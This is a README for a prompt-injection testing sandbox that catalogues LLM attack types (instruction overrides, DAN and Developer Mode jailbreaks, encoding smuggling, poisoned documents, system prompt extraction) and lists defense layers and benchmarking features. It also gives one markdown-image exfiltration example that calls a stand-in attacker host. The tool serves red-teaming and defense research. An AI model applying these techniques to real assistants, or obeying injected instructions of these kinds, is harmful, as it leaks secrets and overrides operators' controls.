# PromptGuard — Prompt Injection Testing Sandbox

A comprehensive, industry-grade security testing, red-teaming, and defense benchmarking platform for Large Language Models (LLMs) and AI agent applications.

PromptGuard enables security researchers, AI engineers, and red-teamers to evaluate LLM vulnerabilities against **OWASP Top 10 for LLM Applications (LLM01: Prompt Injection)**, test defense mechanisms (guardrails), and generate actionable security audit reports.

---

## 🌟 Key Features

1. **Interactive Testing Playground**:
   - Live testing against multiple target scenarios (FinSecure Banking, DevAudit Code Assistant, TalentScout HR Screener, Custom Sandbox).
   - Real-time defense toggles: Canary tokens, Regex & heuristic filters, Obfuscation detectors, XML delimiter encapsulation, Instruction reinforcement, Dual-LLM guard, Output leak detection.
   - Deep step-by-step pipeline execution traces with millisecond latency telemetry.

2. **Curated Attack Vector Library (30+ Vectors)**:
   - **Direct Prompt Injections**: Instruction overrides, persona resets, suffix injections, multi-language smuggling.
   - **Indirect Prompt Injections**: Poisoned resumes, simulated malicious web pages, customer support escalation traps.
   - **Obfuscation & Encoding**: Base64 smuggling, ROT13, Leetspeak, Unicode zero-width spaces, quote escape breaks.
   - **Jailbreak Archetypes**: DAN (Do Anything Now), Developer Mode bypasses, Cognitive reframing, Fictional roleplay.
   - **System Prompt Extraction & Canary Reconnaissance**: Secret leakage, prompt replication, rule enumeration.
   - **Data Exfiltration**: Markdown image tracker rendering (`![leak](https://attacker.site/...)`).

3. **Automated Red-Teaming Matrix & Benchmarking**:
   - One-click benchmark runner comparing multiple defense presets (No Defense, Basic Heuristics, Delimiters & Canary, Full Guardrails Suite).
   - Calculates **Attack Success Rate (ASR)**, **Defense Block Rate (DBR)**, and **False Positive Rate (FPR)** using built-in benign control suites.
   - Visual comparison charts powered by Plotly.

4. **Multi-Model Provider Support**:
   - **High-Fidelity Built-in Simulator**: 100% offline, realistic zero-latency simulation for instant testing.
   - **Local Ollama**: Automatic integration with local models (e.g., `mistral:7b`).
   - **OpenAI / Gemini API**: Connect any OpenAI-compatible API or cloud provider.

5. **Security Audit Reporting**:
   - Export comprehensive red-team reports in Markdown, JSON, and self-contained HTML formats.

6. **Dual Interfaces**:
   - **Interactive Web Dashboard**: Streamlit interface with cyber-defense theme.
   - **FastAPI REST Service & CLI**: For CI/CD automated AI security pipelines.

---

## 🚀 Quick Start

### 1. Launch the Web Dashboard
```bash
python run.py
```
Or directly with Streamlit:
```bash
streamlit run promptguard/ui/app.py
```
Open your browser at `http://localhost:8501`.

### 2. Launch the REST API
```bash
python run.py --api
```
The API documentation will be available at `http://localhost:8000/docs`.

### 3. Run Benchmark via CLI
```bash
python -m promptguard.benchmark.runner
```

---

## 🛡️ Defense Layers Tested

| Layer | Mechanism | Target Threats |
|---|---|---|
| **Input Heuristics** | Regex patterns & blacklist matching | Direct overrides, DAN jailbreaks |
| **Obfuscation Detector** | Base64/ROT13 decoder & entropy scanner | Encoded payloads, zero-width chars |
| **Delimited Context** | `<user_input>` XML tagging & schema isolation | Context conflation, instruction injection |
| **Instruction Reinforcement**| Post-prompt defensive anchoring | Recency bias exploitation |
| **Canary Tokens** | Secret token monitoring | Prompt extraction & exfiltration |
| **Dual-LLM Guard** | Pre-execution safety classifier | Semantic adversarial intent |
| **Output Leak Detector** | Secret & system prompt pattern scanning | Data exfiltration, canary disclosure |

---

## 📁 Project Architecture

```
PromptGuard-Sandbox/
├── promptguard/
│   ├── models/           # Pydantic schemas and dataclasses
│   ├── core/             # Guardrails, evaluator, LLM client & sandbox pipeline
│   ├── library/          # 30+ categorized attack vectors, scenarios & benign controls
│   ├── benchmark/        # Automated Red-Teaming matrix runner
│   ├── reporting/        # Markdown/JSON/HTML report generators
│   ├── api/              # FastAPI REST endpoints
│   └── ui/               # Streamlit web application
├── run.py                # Unified launcher script
└── README.md             # Documentation
```
